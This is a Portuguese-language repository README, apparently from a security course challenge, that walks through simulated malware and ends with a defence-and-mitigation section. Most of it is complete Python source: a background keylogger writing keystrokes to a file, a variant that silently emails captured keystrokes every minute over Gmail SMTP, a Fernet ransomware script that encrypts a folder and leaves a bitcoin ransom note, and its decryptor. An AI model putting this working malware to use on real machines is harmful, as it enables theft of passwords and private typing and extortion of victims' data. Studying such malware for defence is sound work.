# 🛡️ Simulador Educacional de Malwares: Ransomware e Keylogger

Este repositório contém a documentação e os scripts desenvolvidos durante o desafio de simulação de malwares em um **ambiente 100% controlado e para fins estritamente educacionais**. O objetivo do projeto é entender como ameaças cibernéticas operam na captura e no sequestro de dados, focando no desenvolvimento de estratégias de mitigação e defesa.

---

## 📌 Sobre o Projeto
O projeto coloca em prática conceitos de cibersegurança através da criação de scripts em Python que simulam o comportamento de duas das ameaças mais comuns no mundo digital:
1. **Keylogger:** Captura de teclas digitadas para roubo de informações.
2. **Ransomware:** Criptografia de arquivos simulando um sequestro de dados seguido de um pedido de resgate.

⚠️ **Aviso Legal:** *Este projeto tem finalidade estritamente acadêmica. Todo o código fornecido e executado foi feito sob consentimento em um ambiente virtualizado, visando a melhoria das práticas de defesa cibernética.*

---

## 🎯 Objetivos de Aprendizagem
* Compreender o funcionamento prático de um **Ransomware** e de um **Keylogger**.
* Identificar como esses malwares exploram vulnerabilidades técnicas e brechas humanas.
* Analisar a interação dos scripts com o sistema operacional, arquivos e periféricos.
* Desenvolver uma base de conhecimento sobre estratégias de prevenção e defesa corporativa e pessoal.

---

## ⌨️ Parte 1: Simulação de Keylogger

O Keylogger foi desenvolvido para registrar secretamente as teclas pressionadas pelo usuário, simulando um ataque de violação de confidencialidade. Foram implementadas duas abordagens utilizando a biblioteca `pynput`.

### 1. Gravação Local (`keylogger.pyw`)
O script monitora o teclado, formata a entrada (ignorando teclas como Shift e Ctrl para manter o log limpo) e salva os dados em um arquivo local chamado `log.txt`. A extensão `.pyw` é usada para que o script rode em segundo plano no Windows sem abrir uma janela do terminal.

<details>
<summary>💻 Ver código: keylogger.pyw</summary>

```python
from pynput import keyboard 

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try: 
        # se for uma tecla "normal" (letra, número, símbolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass 
            else:
                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
````

</details>

### 2\. Exfiltração por E-mail (`keylogger_email.py`)

Em vez de salvar localmente, esta versão armazena as teclas na memória e, a cada 60 segundos, utiliza a biblioteca `smtplib` para abrir uma conexão SMTP e enviar os dados capturados silenciosamente para o e-mail do atacante.

<details>
<summary>💻 Ver código: keylogger\_email.py\</summary>

```python
from pynput import keyboard 
import smtplib
from email.mime.text import MIMEText
from threading import Timer 

log = ""

#CONFIGURAÇÕES DE E-MAIL 
EMAIL_ORIGEM = "demokeylogger0@gmail.com"
EMAIL_DESTINO= "demokeylogger0@gmail.com"
SENHA_EMAIL = "[SUA_SENHA_AQUI]"

def enviar_email():
    global log 
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To']= EMAIL_DESTINO 
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
        log = ""

    # Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char 
    except AttributeError:
        if key == keyboard.Key.space:
            log +=" "
        elif key == keyboard.Key.enter:
            log += "\n"
        # tratamento de teclas especiais ocultado para brevidade...

enviar_email()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

</details>

-----

## 🔒 Parte 2: Simulação de Ransomware

Simula o sequestro de dados criptografando arquivos de um diretório específico, utilizando criptografia simétrica através da biblioteca `cryptography.fernet`.

### 1\. O Ataque (`ransoware.py`)

O script gera uma chave única, varre a pasta `test_files` e encripta os arquivos encontrados (como `dados_confidenciais` e `senhas.txt`). Por fim, gera um arquivo `LEIA ISSO.txt` com as instruções de resgate.

<details>
<summary>💻 Ver código: ransoware.py</summary>

```python
from cryptography.fernet import Fernet
import os

def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista 

def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envia 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")

if __name__ == "__main__":
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
```

</details>

### 2\. A Recuperação (`descriptografar.py`)

Simula a ferramenta enviada após o suposto pagamento do resgate. Lê a `chave.key` gerada pelo atacante e reverte o processo, restaurando os arquivos originais.

<details>
<summary>💻 Ver código: descriptografar.py</summary>

```python
from cryptography.fernet import Fernet
import os

def carregar_chave():
    return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo,chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and nome != "descriptografar.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista 

def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Arquivos restaurados com sucesso")

if __name__ == "__main__":
    main()
```

</details>

-----

## 🛡️ Reflexão sobre Defesa e Mitigação

Criar essas ferramentas em laboratório deixa claro o quão devastador um ataque real pode ser. Para nos protegermos, é necessário adotar uma abordagem de **Defense in Depth** (Defesa em Profundidade):

### Defesas contra Keyloggers

  * **Soluções Antivírus/EDR:** Sistemas modernos de detecção identificam o comportamento anômalo de scripts que tentam se acoplar a APIs de teclado (como o *hook* do Windows usado pelo `pynput`).
  * **MFA (Autenticação Multifator):** Mesmo que um Keylogger capture senhas em texto claro, o atacante não conseguirá acessar contas sem o token de segundo fator (biometria, app autenticador).
  * **Criptografia de Rede e Firewalls:** Monitorar e bloquear tráfego de saída incomum via SMTP (porta 587) impediria a exfiltração de dados realizada pelo keylogger via e-mail.
  * **Gerenciadores de Senha:** Utilizar o preenchimento automático (Autofill) evita que o usuário precise digitar a senha no teclado.

### Defesas contra Ransomwares

  * **Backups Offline e Imutáveis:** A principal e mais importante defesa. Ter cópias de arquivos críticos em locais não conectados à rede principal ou na nuvem com versionamento inutiliza o pedido de resgate.
  * **Princípio do Menor Privilégio:** O ransomware só pode criptografar os arquivos que o usuário infectado tem permissão para modificar. Limitar as permissões de gravação reduz o impacto da ameaça.
  * **Filtros de E-mail e Conscientização:** A maioria dos ransomwares chega como anexos maliciosos em e-mails (Phishing). Treinar colaboradores para não executarem arquivos suspeitos é a primeira linha de defesa.
  * **Controle de Aplicações e Sandboxing:** Bloquear a execução de scripts não assinados (como o Python) por usuários comuns e testar executáveis desconhecidos em ambientes isolados.

-----

## 🖼️ Simulações Visuais

  * [Tela de Resgate](images/nota_resgate.png)
  * [E-mail do Keylogger](images/email_keylogger.png)

<!-- end list -->
